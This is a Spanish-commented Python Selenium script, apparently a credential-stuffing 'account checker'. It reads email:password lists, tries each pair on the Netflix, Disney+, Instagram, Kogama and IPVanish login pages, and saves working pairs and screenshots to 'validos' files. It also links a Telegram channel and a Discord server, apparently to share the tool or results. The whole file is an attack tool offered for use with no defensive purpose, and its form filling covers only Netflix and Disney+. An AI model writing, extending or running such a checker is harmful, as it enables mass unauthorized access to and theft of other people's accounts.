import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from colorama import Fore, init
import webbrowser
import time

init(autoreset=True)

# Configuración automática de Selenium con WebDriver Manager
chrome_options = Options()
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--log-level=3")  # Reducir el nivel de logs

service = Service(ChromeDriverManager().install())

# URLs de inicio de sesión de cada plataforma
PLATFORMS = {
    "1": ("Netflix", "https://www.netflix.com/login", "cuentas/netflix.txt", "resultados/validos_netflix.txt"),
    "2": ("Disney+", "https://www.disneyplus.com/login", "cuentas/disney.txt", "resultados/validos_disney.txt"),
    "3": ("Instagram", "https://www.instagram.com/accounts/login/", "cuentas/instagram.txt", "resultados/validos_instagram.txt"),
    "4": ("Kogama", "https://www.kogama.com", "cuentas/kogama.txt", "resultados/validos_kogama.txt"),
    "5": ("IPVanish", "https://account.ipvanish.com/", "cuentas/ipvanish.txt", "resultados/validos_ipvanish.txt")
}

def take_screenshot(driver, email, platform_name):
    """Captura de pantalla cuando la cuenta es válida o cuando ocurre un error."""
    try:
        screenshot_path = f"screenshots/{platform_name}_{email.replace('@', '_').replace('.', '_')}.png"
        os.makedirs(os.path.dirname(screenshot_path), exist_ok=True)
        driver.save_screenshot(screenshot_path)
        print(f"📸 Captura de pantalla guardada para {email} en {screenshot_path}")
    except Exception as e:
        print(f"⚠️ Error al guardar la captura de pantalla: {e}")

def login_checker(platform_name, login_url, input_file, output_file):
    """Función para verificar cuentas en la plataforma seleccionada."""
    try:
        with open(input_file, "r") as file:
            accounts = file.readlines()
    except FileNotFoundError:
        print(f"No se encontró el archivo {input_file}.")
        return
    
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    
    for account in accounts:
        try:
            email, password = account.strip().split(":")
        except ValueError:
            print("❌ Formato incorrecto en la línea: ", account.strip())
            continue
        
        print(f"🔍 Probando {email} en {platform_name}...")
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.get(login_url)
        time.sleep(6)
        
        try:
            WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
            
            if platform_name == "Netflix":
                user_input = driver.find_element(By.NAME, "userLoginId")
                pass_input = driver.find_element(By.NAME, "password")
                user_input.clear()
                pass_input.clear()
                user_input.send_keys(email)
                pass_input.send_keys(password)
                pass_input.send_keys(Keys.RETURN)
            
            elif platform_name == "Disney+":
                user_input = driver.find_element(By.CSS_SELECTOR, "input[type='email']")
                user_input.clear()
                user_input.send_keys(email)
                user_input.send_keys(Keys.RETURN)
                time.sleep(8)
                pass_input = WebDriverWait(driver, 15).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password']"))
                )
                pass_input.clear()
                pass_input.send_keys(password)
                pass_input.send_keys(Keys.RETURN)
            
            login_button = WebDriverWait(driver, 15).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[type="submit"]'))
            )
            login_button.click()
            time.sleep(8)
            
            if driver.current_url != login_url:
                print(f"✅ Cuenta válida: {email}")
                take_screenshot(driver, email, platform_name)
                with open(output_file, "a") as valid_file:
                    valid_file.write(f"{email}:{password}\n")
            else:
                print(f"❌ Falló el inicio de sesión: {email}")
        
        except Exception as e:
            print(f"⚠️ Error con {email}: {str(e)}")
            take_screenshot(driver, email, platform_name)
        
        finally:
            driver.quit()
print(Fore.CYAN + "VERSION 1.2")
print(Fore.RED + "1. Netflix")
print(Fore.BLUE + "2. Disney+")
print(Fore.MAGENTA + "3. Instagram")
print(Fore.CYAN + "4. Kogama")
print(Fore.LIGHTGREEN_EX + "5. IPVanish")
print(Fore.LIGHTRED_EX + "6. Salir")
print(Fore.LIGHTCYAN_EX + "7. Abrir mi Telegram en Web")
print(Fore.LIGHTRED_EX + "8. Abrir mi servidor de Discord")

opcion = input("Selecciona una opción (1-8): ")

if opcion == "7":
    webbrowser.open("https://t.me/NoctaPaste")
    print("Abriendo Telegram en Web...")
elif opcion == "8":
    webbrowser.open("https://discord.gg/a8vSeEMqgj")
    print("Abriendo tu servidor de Discord...")
elif opcion == "6":
    print("Saliendo del programa...")
elif opcion in PLATFORMS:
    plataforma, url, archivo, salida = PLATFORMS[opcion]
    login_checker(plataforma, url, archivo, salida)
